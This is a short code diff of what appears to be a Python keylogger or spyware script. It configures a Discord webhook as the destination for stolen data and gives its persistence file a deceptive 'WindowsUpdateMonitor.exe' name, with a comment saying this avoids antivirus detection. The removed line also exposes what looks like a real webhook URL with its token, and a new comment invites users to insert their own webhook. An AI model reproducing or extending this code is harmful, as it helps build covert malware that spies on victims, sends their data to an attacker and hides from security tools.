@@ -10,7 +10,7 @@ import keyboard
 
 # Configurations
 pag.FAILSAFE = True
-WEBHOOK_URL = "https://discord.com/api/webhooks/1466677248181670097/RRP38zXKKQVq906uu1gQA6RB9oVRaDmbP5GksrlseCOoqonJY9jP_Ks29UgPMYf2B6IH"
+WEBHOOK_URL = "https://discord.com/api/webhooks/example"  #put you discord webhook after webhook_url = 
 # Changed filename from svchost.exe to avoid immediate AV flagging
 PERSISTENCE_NAME = "WindowsUpdateMonitor.exe" 
 
@@ -108,4 +108,5 @@ if __name__ == "__main__":
     
     print("Terminated.")
     # Keeps the window open so you can read any error messages if it crashes
+
     input("Press Enter to exit...")
